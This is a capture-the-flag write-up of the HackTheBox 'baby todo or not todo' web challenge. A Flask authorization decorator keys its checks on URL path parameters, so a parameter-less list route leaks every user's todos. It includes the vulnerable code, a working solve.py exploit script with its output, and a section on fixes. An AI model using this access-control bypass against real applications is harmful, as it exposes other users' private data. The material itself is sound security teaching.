---
title: "baby todo or not todo"
date: 2027-04-01 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, broken-access-control, authorization, idor, cwe-285]
description: "An Easy Web challenge: a Flask todo API gates every /api route with one decorator whose authorization decision is keyed on the route's URL path parameters. The one collection route that takes no path parameter skips every ownership check and returns every user's todos — including the admin's flag."
---

## Overview

**baby todo or not todo** is an Easy Web challenge built on a small Flask "todo" API.
Every `/api/*` route is wrapped by a single `verify_integrity` guard that is supposed to
enforce "you may only touch your own todos." The catch: that guard makes its decision from
the route's **URL path parameters**, so the one collection endpoint that takes *no* parameter
slips past every ownership check. The result is [broken authorization](https://cwe.mitre.org/data/definitions/285.html)
([CWE-285](https://cwe.mitre.org/data/definitions/285.html)) — two requests dump every user's
todos, including the one assigned to `admin` that holds the flag.

## The technique

When a shared authorization guard (a Flask `before_request` decorator, an Express middleware,
a servlet filter — anything applied to a whole route group) decides access based on the
**presence and value of the route's path parameters** rather than on the authenticated
principal directly, any sibling route declared with *no* path parameter silently escapes the
ownership logic. A bulk / `list` / `/all` route is the classic blind spot: it has no object id
to check, so the guard's per-resource branch never runs, and it falls through to whatever weak
terminal check sits at the bottom of the decorator.

Here the guard branches entirely on `request.view_args` — the URL path params `<assignee>` and
`<int:todo_id>`:

```python
@api.before_request
@verify_integrity
def and_then(): pass

def check_integrity(*args, **kwargs):
    g.secret = request.args.get('secret', '') or request.form.get('secret', '')
    if request.view_args:                       # ALL ownership logic lives in here
        list_access = request.view_args.get('assignee', '')
        if list_access and list_access != g.user: abort(403)
        todo_id = request.view_args.get('todo_id', '')
        if todo_id:
            g.selected = todo.get_by_id(todo_id)
            if g.selected:
                if dict(g.selected).get('assignee') == g.user:
                    check_secret(g.secret, g.user); return func(*args, **kwargs)
                return abort(403)
            return abort(404)
    ...
    check_secret(g.secret, g.user)              # the weak fallthrough
    return func(*args, **kwargs)
```

`check_secret(secret, name)` only verifies that the supplied `secret` matches **your own**
user's secret, so it passes for any authenticated user. And the developer even left a nervous
note above the offending route:

```python
# TODO: There are not view arguments involved, I hope this doesn't break
# the authentication control on the verify_integrity() decorator
@api.route('/list/all/')
def list_all():
    return jsonify(todo.get_all())   # SELECT * FROM todos -> every user's rows
```

`/api/list/all/` carries no path parameter, so `request.view_args` is empty, the ownership
block is skipped, and `list_all()` returns the entire `todos` table.

We don't even need to guess a secret: the index page renders the *current* user's own secret
straight into a hidden input, so a single `GET /` hands us a valid credential to satisfy the
fallthrough check.

```html
<input id='data-secret' type='hidden' value='{{ secret }}'>
```

## Solution

Two requests: fetch `/` to establish a session and scrape our own secret, then hit the
parameter-less collection route with that secret. The admin's flag-todo comes back in the dump.

Create `solve.py`:

```python
import sys, re, requests

base = sys.argv[1].rstrip('/')
s = requests.Session()

# 1) GET / -> sets our session cookie and leaks our own secret in a hidden input
r = s.get(base + '/')
secret = re.search(r"id='data-secret'\s+type='hidden'\s+value='([^']*)'", r.text).group(1)
print('[*] leaked own secret:', secret)

# 2) parameter-less route skips all ownership checks -> dumps EVERY user's todos
r = s.get(base + '/api/list/all/', params={'secret': secret})
for t in r.json():
    print('   ', t)

flag = next((re.search(r'(HTB\{[^}]+\})', str(t.get('name',''))) for t in r.json()
             if re.search(r'HTB\{', str(t.get('name','')))), None)
print('\n[+] FLAG:', flag.group(1) if flag else None)
```

Run it against the live instance:

```bash
python3 solve.py http://<host>:<port>
```

The dump includes the admin-assigned todo holding the flag:

```text
[*] leaked own secret: 2dbc07d75799Fff
    {'assignee': 'admin', 'done': False, 'id': 6, 'name': 'HTB{...}'}

[+] FLAG: HTB{...}
```

## Why it worked

Authorization was **inferred from the URL's shape** — does this route carry a path parameter? —
instead of being **enforced per handler against the authenticated principal**. Parameterized
routes were consistently guarded; their parameter-less sibling was silently unguarded. That is
a structural blind spot, not a single forgotten check, which is exactly why it survives a casual
read of the decorator: the protected routes all look fine.

## Fix / defense

- Enforce authorization inside each handler against the session identity, never from the
  presence or absence of route parameters.
- A collection endpoint must scope rows to the caller (`todo.get_by_user(g.user)`) or be
  explicitly role-gated (`if g.user != 'admin': abort(403)`) — never return `SELECT *` unscoped.
- Centralize the access decision in one place that runs identically for every route in the group,
  with no `if view_args` branch that some routes skip.
- Don't render a user's own secret or token into HTML where it can be reused to satisfy a weak
  credential check.
